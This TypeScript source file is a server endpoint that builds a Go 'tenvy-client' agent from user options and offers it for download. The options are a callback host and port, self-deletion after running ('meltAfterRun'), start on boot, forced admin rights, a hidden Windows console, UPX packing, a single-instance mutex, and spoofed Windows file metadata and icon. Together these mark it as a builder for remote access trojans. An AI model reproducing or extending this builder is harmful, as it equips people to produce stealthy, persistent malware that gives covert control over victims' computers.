import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { mkdtemp, rm, mkdir, copyFile, chmod, cp, writeFile } from 'node:fs/promises';
import { dirname, join, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { spawn } from 'node:child_process';
import type { SpawnOptionsWithoutStdio } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import { ZodError } from 'zod';
import {
	ALLOWED_EXTENSIONS_BY_OS,
	TARGET_ARCHITECTURES_BY_OS,
	TARGET_OS_VALUES,
	type BuildRequest,
	type BuildResponse,
	type TargetArch,
	type TargetOS,
	type WindowsFileInformation
} from '../../../../../shared/types/build';
import { buildRequestSchema } from '$lib/validation/build-schema';

const allowedTargetOS = new Set<TargetOS>(TARGET_OS_VALUES);
const architectureMatrix = new Map<TargetOS, Set<TargetArch>>(
	TARGET_OS_VALUES.map((os) => [os, new Set(TARGET_ARCHITECTURES_BY_OS[os])])
);
const extensionMatrix = new Map<TargetOS, Set<string>>(
	TARGET_OS_VALUES.map((os) => [os, new Set(ALLOWED_EXTENSIONS_BY_OS[os])])
);

const mutexSanitizer = /[^A-Za-z0-9._-]/g;
const allowedFileInfoEntries = [
	['fileDescription', 'FileDescription'],
	['productName', 'ProductName'],
	['companyName', 'CompanyName'],
	['productVersion', 'ProductVersion'],
	['fileVersion', 'FileVersion'],
	['originalFilename', 'OriginalFilename'],
	['internalName', 'InternalName'],
	['legalCopyright', 'LegalCopyright']
] as const satisfies readonly [keyof WindowsFileInformation, string][];

const allowedFileInfoKeys = new Map(allowedFileInfoEntries);
const maxVersionComponent = 65535;
const maxMutexLength = 120;
const maxIconBytes = 512 * 1024;

function resolveTargetOS(value?: string): TargetOS {
	if (!value) {
		return 'windows';
	}
	const normalized = value.toLowerCase().trim();
	if (allowedTargetOS.has(normalized as TargetOS)) {
		return normalized as TargetOS;
	}
	return 'windows';
}

function resolveTargetArch(value: string | undefined, targetOS: TargetOS): TargetArch {
	const options = architectureMatrix.get(targetOS) ?? new Set<TargetArch>(['amd64']);
	const fallback = options.values().next().value ?? 'amd64';
	if (!value) {
		return fallback;
	}
	const normalized = value.toLowerCase().trim();
	if (options.has(normalized as TargetArch)) {
		return normalized as TargetArch;
	}
	return fallback;
}

function resolveExtension(value: string | undefined, targetOS: TargetOS): string {
	const options = extensionMatrix.get(targetOS) ?? new Set(['.exe']);
	if (!value) {
		return options.values().next().value ?? '.exe';
	}

	const normalized = value.startsWith('.') ? value.toLowerCase() : `.${value.toLowerCase()}`;
	if (options.has(normalized)) {
		return normalized;
	}

	throw error(400, `Extension ${normalized} is not supported for ${targetOS} builds.`);
}

function sanitizeFilename(value: string, extension: string): string {
	const lowerExtension = extension.toLowerCase();
	let base = value;

	if (lowerExtension && base.toLowerCase().endsWith(lowerExtension)) {
		base = base.slice(0, -lowerExtension.length);
	}

	const cleaned = base.replace(/[^A-Za-z0-9._-]/g, '_').replace(/\.+$/, '');
	const safeBase = cleaned.length > 0 ? cleaned : `tenvy-client-${Date.now()}`;

	return `${safeBase}${lowerExtension}`;
}

function sanitizePositiveInteger(
	value: string | number | undefined,
	min: number,
	max: number,
	label: string
): string | null {
	if (value === undefined || value === null) {
		return null;
	}

	const normalized = value.toString().trim();
	if (normalized === '') {
		return null;
	}

	if (!/^\d+$/.test(normalized)) {
		throw error(400, `${label} must be a positive integer.`);
	}

	const parsed = Number.parseInt(normalized, 10);
	if (!Number.isFinite(parsed)) {
		throw error(400, `${label} must be a valid number.`);
	}

	if (parsed < min || parsed > max) {
		throw error(400, `${label} must be between ${min} and ${max}.`);
	}

	return String(parsed);
}

function encodeBase64(value: string): string {
	return Buffer.from(value, 'utf8').toString('base64');
}

function sanitizeMutexName(value: string | undefined): string {
	if (!value) {
		return '';
	}
	const trimmed = value.trim();
	if (!trimmed) {
		return '';
	}
	const sanitized = trimmed.replace(mutexSanitizer, '_');
	return sanitized.slice(0, maxMutexLength);
}

type NormalizedFileInformation = Record<string, string>;

function sanitizeFileInformationPayload(
	payload: BuildRequest['fileInformation'] | null | undefined
): NormalizedFileInformation {
	if (!payload) {
		return {};
	}
	const normalized: NormalizedFileInformation = {};
	for (const [key, label] of allowedFileInfoKeys.entries()) {
		const raw = payload[key];
		if (typeof raw !== 'string') {
			continue;
		}
		const trimmed = raw.trim();
		if (!trimmed) {
			continue;
		}
		normalized[label] = trimmed.slice(0, 256);
	}
	return normalized;
}

function hasFileInformationPayload(payload: NormalizedFileInformation): boolean {
	return Object.keys(payload).length > 0;
}

type VersionParts = { Major: number; Minor: number; Patch: number; Build: number };

type NormalizedBuildRequest = {
	host: string;
	port: string;
	targetOS: TargetOS;
	targetArch: TargetArch;
	outputExtension: string;
	outputFilename: string;
	installationPath: string;
	meltAfterRun: boolean;
	startupOnBoot: boolean;
	developerMode: boolean;
	mutexName: string;
	compressBinary: boolean;
	forceAdmin: boolean;
	pollIntervalMs: string | null;
	maxBackoffMs: string | null;
	shellTimeoutSeconds: string | null;
	fileIcon: BuildRequest['fileIcon'] | null | undefined;
	fileInformation: BuildRequest['fileInformation'] | null | undefined;
	raw: BuildRequest;
};

function formatZodError(err: ZodError): string {
	const issue = err.issues[0];
	if (!issue) {
		return 'Invalid build payload.';
	}
	const path = issue.path.join('.') || 'payload';
	return `${path}: ${issue.message}`;
}

export function normalizeBuildRequestPayload(body: unknown): NormalizedBuildRequest {
	let parsed: BuildRequest;
	try {
		parsed = buildRequestSchema.parse(body);
	} catch (err) {
		if (err instanceof ZodError) {
			throw error(400, formatZodError(err));
		}
		throw error(400, 'Invalid build payload.');
	}

	const host = parsed.host.toString().trim();
	if (!host) {
		throw error(400, 'Host is required');
	}

	if (/\s/.test(host)) {
		throw error(400, 'Host cannot contain whitespace');
	}

	const port = parsed.port !== undefined ? parsed.port.toString().trim() : '2332';
	if (!/^\d+$/.test(port)) {
		throw error(400, 'Port must be numeric');
	}

	const targetOS = resolveTargetOS(parsed.targetOS);
	const targetArch = resolveTargetArch(parsed.targetArch, targetOS);
	const outputExtension = resolveExtension(parsed.outputExtension, targetOS);
	const outputFilename = sanitizeFilename(
		(parsed.outputFilename ?? 'tenvy-client').toString().trim(),
		outputExtension
	);
	const installationPath = (parsed.installationPath ?? '').toString().trim();
	const developerMode = parsed.developerMode !== false;
	const meltAfterRun = Boolean(parsed.meltAfterRun);
	const startupOnBoot = Boolean(parsed.startupOnBoot);
	const mutexName = sanitizeMutexName(parsed.mutexName);
	const compressBinary = Boolean(parsed.compressBinary);
	const forceAdmin = Boolean(parsed.forceAdmin);

	const pollIntervalMs = sanitizePositiveInteger(
		parsed.pollIntervalMs,
		1000,
		3_600_000,
		'Poll interval'
	);
	const maxBackoffMs = sanitizePositiveInteger(
		parsed.maxBackoffMs,
		1000,
		86_400_000,
		'Max backoff'
	);
	const shellTimeoutSeconds = sanitizePositiveInteger(
		parsed.shellTimeoutSeconds,
		5,
		7_200,
		'Shell timeout'
	);

	return {
		host,
		port,
		targetOS,
		targetArch,
		outputExtension,
		outputFilename,
		installationPath,
		meltAfterRun,
		startupOnBoot,
		developerMode,
		mutexName,
		compressBinary,
		forceAdmin,
		pollIntervalMs,
		maxBackoffMs,
		shellTimeoutSeconds,
		fileIcon: parsed.fileIcon ?? null,
		fileInformation: parsed.fileInformation ?? null,
		raw: parsed
	} satisfies NormalizedBuildRequest;
}

function parseVersionParts(value: string | undefined): VersionParts | null {
	if (!value) {
		return null;
	}
	const trimmed = value.trim();
	if (!trimmed) {
		return null;
	}
	const segments = trimmed.split('.').slice(0, 4);
	const numbers: number[] = [];
	for (const segment of segments) {
		const parsed = Number.parseInt(segment, 10);
		if (!Number.isFinite(parsed) || parsed < 0) {
			numbers.push(0);
			continue;
		}
		numbers.push(Math.min(parsed, maxVersionComponent));
	}
	while (numbers.length < 4) {
		numbers.push(0);
	}
	return {
		Major: numbers[0] ?? 0,
		Minor: numbers[1] ?? 0,
		Patch: numbers[2] ?? 0,
		Build: numbers[3] ?? 0
	};
}

type NormalizedFileIcon = { filename: string; buffer: Buffer } | null;

function sanitizeIconFilename(name: string | null | undefined): string {
	if (typeof name !== 'string') {
		return 'icon.ico';
	}
	const trimmed = name.trim();
	if (!trimmed) {
		return 'icon.ico';
	}
	const lower = trimmed.toLowerCase();
	if (!lower.endsWith('.ico')) {
		return 'icon.ico';
	}
	const safe = trimmed.replace(mutexSanitizer, '_').slice(0, 64);
	return safe || 'icon.ico';
}

function normalizeFileIcon(
	payload: BuildRequest['fileIcon'] | null | undefined
): NormalizedFileIcon {
	if (!payload || typeof payload.data !== 'string') {
		return null;
	}
	const trimmed = payload.data.trim();
	if (!trimmed) {
		return null;
	}
	let buffer: Buffer;
	try {
		buffer = Buffer.from(trimmed, 'base64');
	} catch {
		throw error(400, 'Icon payload must be valid base64 data.');
	}
	if (buffer.length === 0) {
		return null;
	}
	if (buffer.length > maxIconBytes) {
		throw error(400, `Icon payload exceeds ${maxIconBytes} bytes.`);
	}
	return {
		filename: sanitizeIconFilename(payload.name ?? null),
		buffer
	};
}

function buildVersionInfoConfig(
	info: NormalizedFileInformation,
	iconFileName: string | null
): Record<string, unknown> {
	const config: Record<string, unknown> = {
		VarFileInfo: {
			Translation: {
				LangID: '0409',
				CharsetID: '04B0'
			}
		}
	};

	if (iconFileName) {
		config.IconPath = iconFileName;
	}

	if (hasFileInformationPayload(info)) {
		config.StringFileInfo = info;
	}

	const fileVersion = parseVersionParts(info.FileVersion);
	const productVersion = parseVersionParts(info.ProductVersion);

	if (fileVersion || productVersion) {
		config.FixedFileInfo = {
			FileVersion: fileVersion ?? { Major: 0, Minor: 0, Patch: 0, Build: 0 },
			ProductVersion: productVersion ?? fileVersion ?? { Major: 0, Minor: 0, Patch: 0, Build: 0 },
			FileFlagsMask: '3f',
			FileFlags: '00',
			FileOS: '040004',
			FileType: '01',
			FileSubtype: '00'
		} satisfies Record<string, unknown>;
	}

	return config;
}

async function runCommand(
	command: string,
	args: readonly string[],
	options: SpawnOptionsWithoutStdio,
	output: string[]
): Promise<number> {
	return await new Promise((resolveCommand, rejectCommand) => {
		const child = spawn(command, args, options);

		child.stdout?.on('data', (chunk) => {
			output.push(chunk.toString());
		});

		child.stderr?.on('data', (chunk) => {
			output.push(chunk.toString());
		});

		child.on('error', rejectCommand);
		child.on('close', (code) => resolveCommand(code ?? 0));
	});
}

async function compressBinaryWithUpx(
	binaryPath: string,
	output: string[],
	warnings: string[]
): Promise<void> {
	try {
		const exitCode = await runCommand(
			'upx',
			['--best', '--lzma', binaryPath],
			{
				cwd: dirname(binaryPath),
				env: process.env,
				stdio: ['pipe', 'pipe', 'pipe']
			},
			output
		);
		if (exitCode !== 0) {
			warnings.push(`Binary compression exited with code ${exitCode}. Artifact left uncompressed.`);
		}
	} catch (err) {
		const code = (err as NodeJS.ErrnoException).code;
		if (code === 'ENOENT') {
			warnings.push('Compression skipped: upx binary is not available in the build environment.');
			return;
		}
		const message = err instanceof Error ? err.message : 'Unknown compression error.';
		warnings.push(`Compression failed: ${message}`);
	}
}

function generateSharedSecret(): string {
	return randomBytes(32).toString('hex');
}

export const POST: RequestHandler = async ({ request }) => {
	let body: unknown;
	try {
		body = await request.json();
	} catch (err) {
		throw error(400, 'Invalid build payload');
	}

	const normalized = normalizeBuildRequestPayload(body);
	const {
		host,
		port,
		targetOS,
		targetArch,
		outputExtension,
		outputFilename,
		installationPath,
		meltAfterRun,
		startupOnBoot,
		developerMode,
		mutexName,
		compressBinary,
		forceAdmin,
		pollIntervalMs,
		maxBackoffMs,
		shellTimeoutSeconds,
		fileIcon,
		fileInformation
	} = normalized;
	const sharedSecret = generateSharedSecret();
	const iconPayload = normalizeFileIcon(fileIcon ?? null);
	const fileInformationPayload = sanitizeFileInformationPayload(fileInformation ?? null);
	const shouldEmbedResources =
		targetOS === 'windows' &&
		(iconPayload !== null || hasFileInformationPayload(fileInformationPayload));

	const repoRoot = resolve(process.cwd(), '..');
	let tempDir: string | null = null;
	const buildOutput: string[] = [];
	const warnings: string[] = [];

	try {
		tempDir = await mkdtemp(join(tmpdir(), 'tenvy-build-'));
		const workDir = join(tempDir, 'src');
		await cp(join(repoRoot, 'tenvy-client'), workDir, { recursive: true });
		const tempBinaryPath = join(tempDir, outputFilename);

		const ldflagsParts = [
			`-X main.defaultServerHostEncoded=${encodeBase64(host)}`,
			`-X main.defaultServerPortEncoded=${encodeBase64(port)}`,
			`-X main.defaultInstallPathEncoded=${encodeBase64(installationPath)}`,
			`-X main.defaultEncryptionKeyEncoded=${encodeBase64(sharedSecret)}`,
			`-X main.defaultMeltAfterRun=${meltAfterRun ? 'true' : 'false'}`,
			`-X main.defaultStartupOnBoot=${startupOnBoot ? 'true' : 'false'}`,
			`-X main.defaultMutexKeyEncoded=${encodeBase64(mutexName)}`,
			`-X main.defaultForceAdminRequirement=${forceAdmin ? 'true' : 'false'}`
		];

		if (pollIntervalMs) {
			ldflagsParts.push(`-X main.defaultPollIntervalOverrideMs=${pollIntervalMs}`);
		}
		if (maxBackoffMs) {
			ldflagsParts.push(`-X main.defaultMaxBackoffOverrideMs=${maxBackoffMs}`);
		}
		if (shellTimeoutSeconds) {
			ldflagsParts.push(`-X main.defaultShellTimeoutOverrideSecs=${shellTimeoutSeconds}`);
		}
		if (compressBinary) {
			ldflagsParts.push('-s -w');
		}

		if (!developerMode && targetOS === 'windows') {
			ldflagsParts.push('-H=windowsgui');
		}

		if (shouldEmbedResources) {
			const cmdDir = join(workDir, 'cmd');
			const iconFileName = iconPayload?.filename ?? null;
			const versionConfig = buildVersionInfoConfig(fileInformationPayload, iconFileName);
			await writeFile(
				join(cmdDir, 'versioninfo.json'),
				`${JSON.stringify(versionConfig, null, 2)}\n`,
				'utf8'
			);
			if (iconPayload) {
				await writeFile(join(cmdDir, iconPayload.filename), iconPayload.buffer);
			}
			const goversionArgs = [
				'run',
				'github.com/josephspurrier/goversioninfo/cmd/goversioninfo@v1.4.0',
				'-64'
			] as const;
			const goversionExit = await runCommand(
				'go',
				goversionArgs,
				{
					cwd: cmdDir,
					env: process.env,
					stdio: ['pipe', 'pipe', 'pipe']
				},
				buildOutput
			);
			if (goversionExit !== 0) {
				warnings.push(
					`Embedding Windows resources failed with exit code ${goversionExit}. Continuing without version metadata.`
				);
			}
		}

		const ldflags = ldflagsParts.join(' ');

		const goArgs = ['build', '-ldflags', ldflags, '-o', tempBinaryPath, './cmd'] as const;
		const goEnv = {
			...process.env,
			GOOS: targetOS,
			GOARCH: targetArch,
			CGO_ENABLED: '0'
		} satisfies NodeJS.ProcessEnv;

		const exitCode = await runCommand(
			'go',
			goArgs,
			{
				cwd: workDir,
				env: goEnv,
				stdio: ['pipe', 'pipe', 'pipe']
			},
			buildOutput
		);

		if (exitCode !== 0) {
			const logLines = buildOutput
				.join('')
				.split(/\r?\n/)
				.filter((line) => line.trim().length > 0);
			const response: BuildResponse = {
				success: false,
				message: `go build failed with exit code ${exitCode}`,
				log: logLines,
				warnings
			};
			return json(response, { status: 200 });
		}

		if (compressBinary) {
			await compressBinaryWithUpx(tempBinaryPath, buildOutput, warnings);
		}

		const logLines = buildOutput
			.join('')
			.split(/\r?\n/)
			.filter((line) => line.trim().length > 0);

		const buildsDir = join(repoRoot, 'tenvy-server', 'static', 'builds');
		await mkdir(buildsDir, { recursive: true });
		const finalPath = join(buildsDir, outputFilename);

		await copyFile(tempBinaryPath, finalPath);
		await chmod(finalPath, 0o755);

		const response: BuildResponse = {
			success: true,
			message: 'Agent built successfully',
			outputPath: finalPath,
			downloadUrl: `/builds/${encodeURIComponent(outputFilename)}`,
			log: logLines,
			sharedSecret,
			warnings
		};

		return json(response);
	} catch (err) {
		const captured = buildOutput
			.join('')
			.split(/\r?\n/)
			.filter((line) => line.trim().length > 0);

		if (err instanceof Error && (err as NodeJS.ErrnoException).code === 'ENOENT') {
			return json(
				{
					success: false,
					message: 'Go compiler is not available in the build environment.',
					log: captured,
					warnings
				},
				{ status: 200 }
			);
		}

		const message = err instanceof Error ? err.message : 'Failed to build agent';
		return json(
			{
				success: false,
				message,
				log: captured,
				warnings
			},
			{ status: 200 }
		);
	} finally {
		if (tempDir) {
			await rm(tempDir, { recursive: true, force: true });
		}
	}
};
